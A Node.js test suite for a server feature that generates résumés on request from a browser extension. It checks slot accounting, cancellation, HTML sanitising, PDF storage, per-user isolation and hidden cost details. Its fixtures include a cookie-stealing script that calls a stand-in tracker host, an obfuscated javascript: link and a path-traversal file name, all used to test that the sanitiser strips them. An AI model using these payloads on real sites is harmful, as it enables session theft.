// ⭐ D98 P1 · A RÉSUMÉ GENERATED ON THE PAGE — the server (lane J3). The extension asks; draft's server generates with
// the web app's own generation; the user sees the allowance, never a cost. Real routes and the real service on the full
// schema; the GENERATION is a stub (no model is ever called here) that stores through D57's one store, as
// coreGenerateResume does, and honours the cancel hook as coreGenerateResume does (pinned on the source below).
// Every rule below was shown red with the rule removed (lane J3's report lists the mutations).
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import express from "express";
import Database from "better-sqlite3";
import { MIGRATIONS } from "../scripts/migrations.js";
import { createExtensionResumeRouter } from "../routes/extensionResume.js";
import { createExtensionResumeService, GenerationCancelledError, pdfFileName, PDF_FILE_NAME_PATTERN,
  ATTACH_SAVES_VERSION, REGENERATE_SPENDS_SLOT, REGENERATE_WARNING, USER_ERRORS } from "../services/extensionResume.js";
import { sanitiseResumeHtml } from "../services/resumePreviewSanitiser.js";
import { storeGeneratedResume } from "../services/generatedResumes.js";
import { snapshotResumeForRecord } from "../services/applicationArtifacts.js";
import { USER_HIDDEN_GENERATION_FIELDS } from "../services/costVisibility.js";

const read = (p) => fs.readFileSync(p, "utf8").replace(/\r\n/g, "\n");
const BASE = "Ada Example — Software Engineer. Built distributed systems in Go and Python for six years; led a team of four; " +
  "shipped a payments ledger; wrote the on-call runbook; mentored two engineers; reduced p99 latency by 40%.";
const PDF_BYTES = Buffer.from("%PDF-1.4\n% synthetic test PDF\n%%EOF\n");
// What a generated résumé could carry if anything upstream misbehaved: a script, an external image, a handler.
const GENERATED = `<!DOCTYPE html><html><head><style>@import "https://cdn.tracker.test/x.css"; body{background:url(https://cdn.tracker.test/bg.png)}</style>
<link rel="stylesheet" href="https://cdn.tracker.test/a.css"></head><body>
<div class="header" onclick="steal()"><span class="name">Ada Example</span></div><script>fetch("https://cdn.tracker.test/?c="+document.cookie)</script>
<img src="https://cdn.tracker.test/pixel.png"><ul class="bullets"><li>Led a team of four building a payments ledger in Go</li></ul>
<a href="javascript:alert(1)">x</a><a href="https://www.linkedin.com/in/ada-example">LinkedIn</a></body></html>`;

function mount({ manual = false, startLimit, generateImpl } = {}) {
  const db = new Database(":memory:");
  db.pragma("foreign_keys = ON");
  for (const m of MIGRATIONS) db.exec(m.sql);
  db.prepare("INSERT INTO users (id,username,password_hash,plan_tier) VALUES (1,'ada','x','PRO'), (2,'blake','x','PRO')").run();
  db.prepare("INSERT INTO domain_profiles (id,user_id,profile_name,role_family,domain,is_active) VALUES (10,1,'SWE','engineering','software',1), (20,2,'SWE','engineering','software',1)").run();
  db.prepare("INSERT INTO profile_base_resumes (profile_id,user_id,name,content) VALUES (10,1,'base.txt',?), (20,2,'base.txt',?)").run(BASE, BASE);
  db.prepare("INSERT INTO user_profile (user_id,first_name,last_name,email) VALUES (1,'Ada','Example','ada@example.test'), (2,'Blake','Sample','blake@example.test')").run();
  db.prepare(`INSERT INTO scraped_jobs (job_id,title,company,location,url,apply_url,search_query,_hash,discovered_at) VALUES
    ('wd-zoom-1','Software Engineer','Zoom','Remote (US)','https://zoom.wd5.myworkdayjobs.com/Zoom/job/x_R19749','https://zoom.wd5.myworkdayjobs.com/Zoom/job/x_R19749/apply','t','h1',unixepoch()),
    ('gh-other-2','Product Manager','Acme','Remote (US)','https://boards.greenhouse.io/acme/jobs/2','https://boards.greenhouse.io/acme/jobs/2','t','h2',unixepoch())`).run();
  // each job is its captor's own (a capture puts it in the user's imports — services/manualHandoff.js userHasJob)
  db.prepare("INSERT INTO job_captures (user_id, job_id, url, origin, action) VALUES (1,'wd-zoom-1','https://zoom.wd5.myworkdayjobs.com/Zoom/job/x_R19749','capture','attached'), (2,'gh-other-2','https://boards.greenhouse.io/acme/jobs/2','capture','attached')").run();

  const calls = [];
  const rendered = [];
  const ctl = { mode: "ok", gate: null, html: GENERATED };
  const generate = generateImpl || (async ({ userId, jobId, job, isCancelled }) => {
    calls.push({ userId, jobId });
    if (isCancelled()) throw new GenerationCancelledError("before_model");
    if (ctl.gate) await ctl.gate;
    if (ctl.mode === "refuse") throw Object.assign(new Error("withheld"), { code: "resume_claim_violation",
      violations: [{ message: "The résumé claims 9 years of experience; your profile states 6." }] });
    if (ctl.mode === "fail") throw Object.assign(new Error("Your credit balance is too low to access claude-sonnet-5 (12,000 input tokens, $0.04)"), { code: "tools_service_error" });
    if (isCancelled()) throw new GenerationCancelledError("after_model");
    const s = storeGeneratedResume(db, { userId, jobId, job, tool: "a_plus_resume", html: ctl.html, atsScore: 81, baseAtsScore: 62, domainProfileId: userId === 1 ? 10 : 20 });
    // what coreGenerateResume's caller could leak if the service echoed it — it must not
    return { version: s.version, html: ctl.html, atsScore: 81, baseAtsScore: 62, resumeId: s.resumeId, tool: "a_plus_resume", model: "claude-sonnet-5", usage: { inputTokens: 12000, costUsd: 0.04 } };
  });
  const deferred = [];
  const service = createExtensionResumeService({
    db, generate, renderPdf: async (html) => { rendered.push(html); return PDF_BYTES; },
    defer: manual ? (fn) => deferred.push(fn) : (fn) => setImmediate(fn), log: { error() {}, warn() {} },
  });
  const app = express();
  app.use(express.json());
  app.use((req, _res, next) => { req.user = { id: Number(req.get("x-user") || 1) }; req.isExt = req.get("x-ext") !== "0"; next(); });
  app.use(createExtensionResumeRouter({ service, requireAuth: (q, r, n) => n(), isExtension: (req) => req.isExt, ...(startLimit ? { startLimit } : {}) }));
  const server = app.listen(0);
  const base = `http://127.0.0.1:${server.address().port}`;
  const bodies = [];
  const call = (method, path, body, { user = 1, ext = true } = {}) => fetch(`${base}${path}`, {
    method, headers: { "content-type": "application/json", "x-user": String(user), "x-ext": ext ? "1" : "0" }, body: body ? JSON.stringify(body) : undefined,
  }).then(async r => {
    const isPdf = (r.headers.get("content-type") || "").includes("application/pdf");
    const out = { status: r.status, headers: r.headers, body: isPdf ? Buffer.from(await r.arrayBuffer()) : await r.json().catch(() => ({})) };
    if (!isPdf) bodies.push(out.body);
    return out;
  });
  const post = (p, b, o) => call("POST", p, b, o);
  const get = (p, o) => call("GET", p, null, o);
  const start = (o = {}, opts) => post("/api/extension/resume", { boundJobId: "wd-zoom-1", trigger: "click", ...o }, opts);
  const until = async (id, done = (s) => !["queued", "generating"].includes(s), o) => {
    for (let i = 0; i < 200; i++) { const r = await get(`/api/extension/resume/${id}`, o); if (done(r.body.status)) return r; await new Promise(z => setTimeout(z, 5)); }
    throw new Error("never settled");
  };
  const flush = async () => { for (let i = 0; i < 20; i++) { while (deferred.length) deferred.shift()(); await new Promise(z => setImmediate(z)); } };
  const slots = (user = 1) => db.prepare("SELECT COUNT(*) FROM draft_slot_uses WHERE user_id=? AND kind='generate'").pluck().get(user);
  const versions = (user = 1) => db.prepare("SELECT COUNT(*) FROM resume_versions WHERE user_id=?").pluck().get(user);
  return { db, ctl, calls, rendered, bodies, post, get, start, until, flush, slots, versions, service, stop: () => { server.close(); db.close(); } };
}

// ── ⛔ USER-TRIGGERED ONLY ────────────────────────────────────────────────────────────────────────────────────────
test("⛔ user-triggered only: no click, no generation — and nothing starts one at boot, on a read, or anywhere else", async (t) => {
  const m = mount(); t.after(m.stop);
  assert.equal(m.db.prepare("SELECT COUNT(*) FROM extension_resume_generations").pluck().get(), 0, "creating the service starts nothing");
  const r = await m.post("/api/extension/resume", { boundJobId: "wd-zoom-1" });
  assert.equal(r.status, 400);
  assert.equal(r.body.code, "trigger_required");
  const r2 = await m.post("/api/extension/resume", { boundJobId: "wd-zoom-1", trigger: "auto" });
  assert.equal(r2.status, 400, "only the click's trigger is a trigger");
  const g = await m.get("/api/extension/resume/erg_doesnotexist");
  assert.equal(g.status, 404, "a read never creates");
  await new Promise(z => setTimeout(z, 20));
  assert.equal(m.calls.length, 0, "the generation was never called");
  assert.equal(m.slots(), 0);
  assert.equal(m.db.prepare("SELECT COUNT(*) FROM extension_resume_generations").pluck().get(), 0);
  // the one caller of start() is the POST route; server.js wires the service and calls nothing on it
  assert.match(read("routes/extensionResume.js"), /if \(req\.body\?\.trigger !== "click"\) return send\(res, userError\("trigger_required"\)\);\n\s+const jobId[\s\S]*service\.start\(/);
  for (const f of ["server.js", "routes/apply.js", "services/applyAutomation.js"]) assert.doesNotMatch(read(f), /extensionResume\.(start|pdf)\(/, `${f} never starts one`);
});

test("⛔ the extension's own credential only — a browser tab is refused", async (t) => {
  const m = mount(); t.after(m.stop);
  const r = await m.start({}, { ext: false });
  assert.equal(r.status, 403);
  assert.equal(r.body.code, "extension_only");
  assert.equal(m.slots(), 0);
  assert.match(read("server.js"), /createExtensionResumeRouter\(\{ service: extensionResume, requireAuth, isExtension: isExtensionCredential \}\)/,
    "server.js admits the extension's TOKEN (auth_contexts user agent), not a header a page could fake");
});

// ── ⛔ THE SLOT ──────────────────────────────────────────────────────────────────────────────────────────────────
test("⛔ the slot is spent at start, ONCE per (job, base-résumé hash); a new base or Regenerate is a new generation", async (t) => {
  const m = mount(); t.after(m.stop);
  const a = await m.start();
  assert.equal(a.status, 202);
  assert.equal(a.body.status, "queued");
  assert.equal(m.slots(), 1, "spent when it starts");
  const b = await m.start();
  assert.equal(b.body.id, a.body.id, "the same request is the same generation");
  assert.equal(b.body.alreadyRequested, true);
  assert.equal(m.slots(), 1, "a second click spends nothing");
  const ready = await m.until(a.body.id);
  assert.equal(ready.body.status, "ready");
  const c = await m.start();
  assert.equal(c.body.id, a.body.id, "a ready one is returned, not remade");
  assert.equal(m.slots(), 1);
  assert.equal(m.calls.length, 1, "generated exactly once");
  // Regenerate: another slot, and a plain warning (⚠ provisional, owner decides)
  assert.equal(REGENERATE_SPENDS_SLOT, true);
  const d = await m.start({ regenerate: true });
  assert.notEqual(d.body.id, a.body.id);
  assert.equal(d.body.warning, REGENERATE_WARNING);
  assert.equal(m.slots(), 2);
  await m.until(d.body.id);
  // a new base résumé is a new (job, base) pair
  m.db.prepare("UPDATE profile_base_resumes SET content = ? WHERE profile_id = 10").run(BASE + " Also: Kubernetes.");
  const e = await m.start();
  assert.notEqual(e.body.id, d.body.id);
  assert.equal(m.slots(), 3);
});

test("⭐ a résumé the web app already made for this job from this base is reused — no slot, no model", async (t) => {
  const m = mount(); t.after(m.stop);
  // the web's Generate stored a version made from the current base (D90 records its upload)
  storeGeneratedResume(m.db, { userId: 1, jobId: "wd-zoom-1", job: { company: "Zoom", title: "Software Engineer" }, html: "<div>Ada Example web version</div>", atsScore: 77, baseAtsScore: 60, domainProfileId: 10 });
  const r = await m.start();
  assert.equal(r.status, 200);
  assert.equal(r.body.status, "ready");
  assert.equal(r.body.fromExisting, true);
  assert.deepEqual(r.body.score, { before: 60, after: 77 });
  assert.equal(m.slots(), 0);
  assert.equal(m.calls.length, 0);
});

test("⛔ refunded on a cancel before the work begins — and the work never runs", async (t) => {
  const m = mount({ manual: true }); t.after(m.stop);
  const a = await m.start();
  assert.equal(m.slots(), 1);
  const c = await m.post(`/api/extension/resume/${a.body.id}/cancel`);
  assert.equal(c.status, 200);
  assert.equal(c.body.status, "cancelled");
  assert.equal(c.body.slot.refunded, true);
  assert.equal(m.slots(), 0, "the slot is back");
  await m.flush();
  assert.equal(m.calls.length, 0, "cancel stops the work: the generation never ran");
  assert.equal(m.versions(), 0);
  const again = await m.post(`/api/extension/resume/${a.body.id}/cancel`);
  assert.equal(again.status, 409, "a finished one cannot be cancelled twice");
});

test("⛔ refunded on a server failure — and the user reads one fixed sentence, never the upstream's", async (t) => {
  const m = mount(); t.after(m.stop);
  m.ctl.mode = "fail";
  const a = await m.start();
  const r = await m.until(a.body.id);
  assert.equal(r.body.status, "failed");
  assert.equal(r.body.error.message, USER_ERRORS.unavailable.message);
  assert.equal(r.body.error.message, "Résumé generation is unavailable right now.");
  assert.equal(r.body.slot.refunded, true);
  assert.equal(m.slots(), 0);
  assert.doesNotMatch(JSON.stringify(r.body), /credit|balance|claude|tokens|\$0/i);
});

test("⛔ cancel during the work: nothing is stored or attached; the slot stays spent (the work was done)", async (t) => {
  const m = mount(); t.after(m.stop);
  let release; m.ctl.gate = new Promise(z => { release = z; });
  const a = await m.start();
  await m.until(a.body.id, (s) => s === "generating");
  const c = await m.post(`/api/extension/resume/${a.body.id}/cancel`);
  assert.equal(c.body.status, "cancelled");
  release();
  await new Promise(z => setTimeout(z, 30));
  const r = await m.get(`/api/extension/resume/${a.body.id}`);
  assert.equal(r.body.status, "cancelled");
  assert.equal(m.versions(), 0, "cancel stops the work: the store never happened");
  assert.equal(r.body.preview, undefined);
  assert.equal(m.slots(), 1, "the model call was sent — the slot is not refunded");
  // coreGenerateResume honours the hook: before the model call and before the store
  const src = read("server.js");
  const core = src.slice(src.indexOf("async function coreGenerateResume("), src.indexOf("// ── COST VISIBILITY (owner, 10-09)"));
  const before = core.indexOf('if (isCancelled?.()) throw new GenerationCancelledError("before_model");');
  const call = core.indexOf("generated = await toolsService.generate(generateBody);");
  const after = core.indexOf('if (isCancelled?.()) throw new GenerationCancelledError("after_model");');
  const store = core.indexOf("stored = storeGeneratedResume(db, {");
  assert.ok(before > 0 && before < call, "checked before the model call");
  assert.ok(after > call && after < store, "checked before the store");
});

// ── ⛔ THE CLAIM GUARD ────────────────────────────────────────────────────────────────────────────────────────────
test("⛔ a guard refusal stores nothing and attaches nothing — the reasons in plain words", async (t) => {
  const m = mount(); t.after(m.stop);
  m.ctl.mode = "refuse";
  const a = await m.start();
  const r = await m.until(a.body.id);
  assert.equal(r.body.status, "refused");
  assert.deepEqual(r.body.guard, { passed: false, reasons: ["The résumé claims 9 years of experience; your profile states 6."] });
  assert.equal(r.body.preview, undefined);
  assert.equal(m.versions(), 0, "nothing stored");
  assert.equal(m.db.prepare("SELECT COUNT(*) FROM resumes").pluck().get(), 0);
  const p = await m.post(`/api/extension/resume/${a.body.id}/pdf`, { attach: true });
  assert.equal(p.status, 409);
  assert.equal(p.body.code, "not_ready");
  assert.equal(m.db.prepare("SELECT COUNT(*) FROM resume_pdf_artifacts").pluck().get(), 0, "nothing attached");
  assert.equal(m.rendered.length, 0);
  assert.equal(m.slots(), 0, "⚠ provisional: a refusal gives the slot back, as the web's Generate charges nothing for one");
});

// ── ⛔ THE PREVIEW ────────────────────────────────────────────────────────────────────────────────────────────────
test("⛔ the preview HTML is sanitised — the script and the external image are dropped; the résumé stays", async (t) => {
  const m = mount(); t.after(m.stop);
  const a = await m.start();
  const r = await m.until(a.body.id);
  const html = r.body.preview.html;
  assert.doesNotMatch(html, /<script/i);
  assert.doesNotMatch(html, /<img/i);
  assert.doesNotMatch(html, /tracker\.test/, "no external resource of any kind — image, stylesheet, @import, url()");
  assert.doesNotMatch(html, /onclick|javascript:/i);
  assert.match(html, /Ada Example/);
  assert.match(html, /Led a team of four building a payments ledger in Go/);
  assert.match(html, /href="https:\/\/www\.linkedin\.com\/in\/ada-example"/, "an ordinary link is a link, not a resource");
  assert.deepEqual(r.body.score, { before: 62, after: 81 });
  assert.equal(r.body.guard.passed, true);
  assert.ok(r.body.changes?.summary, "the D90 change set rides with the result");
});

test("⛔ the sanitiser is an allow-list: handlers, data and javascript links, svg, iframes, forms and CSS loads are gone", () => {
  const { html, removed } = sanitiseResumeHtml(`<p style="color:red;background-image:url('https://x.test/a.png')">ok</p>
    <a href=" jav&#x61;script:alert(1)">a</a><a href="data:text/html,hi">b</a><a href="mailto:ada@example.test">c</a>
    <svg><script>1</script><a href="https://x.test">s</a></svg><iframe src="https://x.test"></iframe><form><input name=q></form>
    <object data="https://x.test/o"></object><style>@import url(https://x.test/s.css); li{color:blue}</style><custom-el>kept</custom-el><!-- c -->`);
  assert.doesNotMatch(html, /x\.test/);
  assert.doesNotMatch(html, /javascript|data:|<svg|<iframe|<form|<input|<object|<!--/i);
  assert.match(html, /<p style="color:red;background-image:none">ok<\/p>/);
  assert.match(html, /href="mailto:ada@example\.test"/);
  assert.match(html, /<style> li\{color:blue\}<\/style>/);
  assert.match(html, /kept/, "an unknown tag is unwrapped, its text kept");
  assert.ok(removed.tags >= 5 && removed.urls >= 4);
});

// ── ⛔ THE PDF ────────────────────────────────────────────────────────────────────────────────────────────────────
test("⛔ the PDF is printed from the SANITISED HTML, stored, and linked to the job and the apply snapshot", async (t) => {
  const m = mount(); t.after(m.stop);
  const a = await m.start();
  await m.until(a.body.id);
  const p = await m.post(`/api/extension/resume/${a.body.id}/pdf`, { attach: true });
  assert.equal(p.status, 200, JSON.stringify(p.body));
  assert.equal(p.body.pdf.fileName, "Ada_Example_Zoom_Software_Engineer.pdf");
  assert.equal(p.body.pdf.attached, true);
  assert.equal(m.rendered.length, 1);
  assert.doesNotMatch(m.rendered[0], /<script|tracker\.test/, "the server's Chromium never sees a script or an external URL");
  const row = m.db.prepare("SELECT * FROM resume_pdf_artifacts").get();
  assert.equal(row.job_id, "wd-zoom-1");
  assert.equal(row.generation_id, a.body.id);
  assert.ok(row.attached_at);
  assert.equal(row.record_id, null, "no application recorded yet");
  // the file itself
  const f = await m.get(`/api/extension/resume/${a.body.id}/pdf/file`);
  assert.equal(f.status, 200);
  assert.match(f.headers.get("content-type"), /application\/pdf/);
  assert.match(f.headers.get("content-disposition"), /Ada_Example_Zoom_Software_Engineer\.pdf/);
  assert.deepEqual(f.body, PDF_BYTES);
  // asking again prints nothing new
  await m.post(`/api/extension/resume/${a.body.id}/pdf`, { attach: true });
  assert.equal(m.rendered.length, 1);
  assert.equal(m.db.prepare("SELECT COUNT(*) FROM resume_pdf_artifacts").pluck().get(), 1);
  // ⚠ provisional: Attach also keeps the version (and makes it the job's current résumé, so the snapshot is this document)
  assert.equal(ATTACH_SAVES_VERSION, true);
  assert.equal(m.db.prepare("SELECT is_kept FROM resume_versions WHERE user_id=1 AND job_id='wd-zoom-1'").pluck().get(), 1);
  // the application is recorded → the snapshot is taken → the PDF joins the record and its snapshot (What we sent)
  m.db.prepare("INSERT INTO application_records (user_id, job_id, state, origin) VALUES (1, 'wd-zoom-1', 'recorded', 'extension')").run();
  const snap = snapshotResumeForRecord(m.db, { userId: 1, jobId: "wd-zoom-1" });
  assert.equal(snap.stored, true);
  assert.equal(snap.pdfId, row.id);
  const linked = m.db.prepare("SELECT record_id, snapshot_artifact_id FROM resume_pdf_artifacts WHERE id = ?").get(row.id);
  assert.equal(linked.record_id, m.db.prepare("SELECT id FROM application_records WHERE user_id=1").pluck().get());
  assert.equal(linked.snapshot_artifact_id, snap.artifactId);
  const after = await m.get(`/api/extension/resume/${a.body.id}`);
  assert.equal(after.body.pdf.keptWithApplication, true);
});

test("⛔ a PDF attached after the application was recorded is linked at once", async (t) => {
  const m = mount(); t.after(m.stop);
  const a = await m.start();
  await m.until(a.body.id);
  m.db.prepare("INSERT INTO application_records (user_id, job_id, state, origin) VALUES (1, 'wd-zoom-1', 'pending', 'extension')").run();
  const p = await m.post(`/api/extension/resume/${a.body.id}/pdf`, { attach: true });
  assert.equal(p.body.pdf.keptWithApplication, true);
});

test("the file name: FirstName_LastName_Company_Role.pdf — letters, digits and underscores only (⚠ provisional)", () => {
  assert.equal(PDF_FILE_NAME_PATTERN, "FirstName_LastName_Company_Role.pdf");
  assert.equal(pdfFileName({ firstName: "Zoë", lastName: "O'Brien-Smith", company: "AT&T Labs, Inc.", role: "Sr. Engineer / ML (Remote)" }),
    "Zoe_O_Brien_Smith_AT_T_Labs_Inc_Sr_Engineer_ML_Remote.pdf");
  assert.equal(pdfFileName({}), "Resume.pdf");
  assert.match(pdfFileName({ firstName: "../../etc", lastName: "<x>" }), /^[A-Za-z0-9_]+\.pdf$/);
});

// ── ⛔ ANOTHER USER'S JOB ───────────────────────────────────────────────────────────────────────────────────────────
test("⛔ another user's job is refused, and another user's generation is not there", async (t) => {
  const m = mount(); t.after(m.stop);
  const r = await m.post("/api/extension/resume", { boundJobId: "gh-other-2", trigger: "click" });
  assert.equal(r.status, 404);
  assert.equal(r.body.code, "not_your_job");
  const none = await m.post("/api/extension/resume", { trigger: "click" });
  assert.equal(none.status, 400, "no binding, no generation");
  assert.equal(m.slots(), 0);
  const a = await m.start();
  for (const path of [`/api/extension/resume/${a.body.id}`, `/api/extension/resume/${a.body.id}/pdf/file`]) {
    assert.equal((await m.get(path, { user: 2 })).status, 404, path);
  }
  assert.equal((await m.post(`/api/extension/resume/${a.body.id}/cancel`, {}, { user: 2 })).status, 404);
  assert.equal((await m.post(`/api/extension/resume/${a.body.id}/pdf`, {}, { user: 2 })).status, 404);
});

// ── ⛔ RATE LIMIT ────────────────────────────────────────────────────────────────────────────────────────────────────
test("⛔ starts are rate-limited per user", async (t) => {
  const m = mount({ startLimit: { limit: 2, windowMs: 60_000 } }); t.after(m.stop);
  assert.equal((await m.start()).status, 202);
  assert.equal((await m.start()).status, 200);
  const r = await m.start();
  assert.equal(r.status, 429);
  assert.equal(r.body.code, "rate_limited");
  assert.equal(r.body.error, USER_ERRORS.rate_limited.message);
  assert.equal((await m.start({}, { user: 2 })).status, 404, "another user has their own window (and here no such job)");
});

// ── ⛔ NO COST, TOKEN OR MODEL TEXT ─────────────────────────────────────────────────────────────────────────────────
test("⛔ no money, token counts, model or tool names in ANY response — ready, failed, refused, cancelled, PDF", async (t) => {
  const m = mount(); t.after(m.stop);
  // the generation stub returns tool / model / usage — the service must not echo them
  const a = await m.start();
  await m.until(a.body.id);
  await m.post(`/api/extension/resume/${a.body.id}/pdf`, { attach: true });
  await m.start({ regenerate: true });
  m.ctl.mode = "fail";
  m.db.prepare("UPDATE profile_base_resumes SET content = ? WHERE profile_id = 10").run(BASE + " v2");
  const f = await m.start(); await m.until(f.body.id);
  m.ctl.mode = "refuse";
  m.db.prepare("UPDATE profile_base_resumes SET content = ? WHERE profile_id = 10").run(BASE + " v3");
  const g = await m.start(); await m.until(g.body.id);
  await m.post(`/api/extension/resume/${g.body.id}/cancel`);
  await m.start({}, { ext: false });
  assert.ok(m.bodies.length >= 10);
  const keys = (v, out = []) => { if (v && typeof v === "object") for (const [k, x] of Object.entries(v)) { out.push(k); keys(x, out); } return out; };
  for (const b of m.bodies) {
    for (const k of keys(b)) assert.ok(!USER_HIDDEN_GENERATION_FIELDS.includes(k), `hidden key "${k}" in ${JSON.stringify(b).slice(0, 120)}`);
    const text = JSON.stringify({ ...b, preview: undefined });
    assert.doesNotMatch(text, /cost|usd|\$\d|token|model|claude|sonnet|opus|haiku|anthropic|openai|credit|a_plus|A\+/i, text.slice(0, 300));
  }
});

// ── boot recovery is not a start ─────────────────────────────────────────────────────────────────────────────────
test("a generation left queued by a restart is failed and refunded — recovery, never a new start", async (t) => {
  const m = mount({ manual: true }); t.after(m.stop);
  const a = await m.start();
  assert.equal(m.slots(), 1);
  const calls = [];
  createExtensionResumeService({ db: m.db, generate: async () => { calls.push(1); }, renderPdf: async () => PDF_BYTES, defer: () => {}, log: { error() {} } });
  const row = m.db.prepare("SELECT status, slot_refunded_at FROM extension_resume_generations WHERE id = ?").get(a.body.id);
  assert.equal(row.status, "failed");
  assert.ok(row.slot_refunded_at);
  assert.equal(m.slots(), 0);
  assert.equal(calls.length, 0);
});

// ── migrations ───────────────────────────────────────────────────────────────────────────────────────────────────
test("migrations 165 and 166 are additive and byte-identical in both runners", () => {
  const raw = (p) => fs.readFileSync(p, "utf8");
  // the whole entry, from its opening brace (its comment included) to its closing one — raw bytes, CRLF and all
  const block = (s, id) => { const i = s.indexOf(`      id: "${id}"`); assert.ok(i > 0, id); return s.slice(s.lastIndexOf("    {", i), s.indexOf("\n    },", i)); };
  for (const id of ["165_extension_resume_generations", "166_resume_pdf_artifacts"]) {
    assert.equal(block(raw("server.js"), id), block(raw("scripts/migrations.js"), id), `${id} differs between the runners`);
    assert.doesNotMatch(block(raw("server.js"), id), /\bDROP\b|DELETE FROM|UPDATE \w+ SET|ALTER TABLE/i, `${id} is additive`);
  }
});
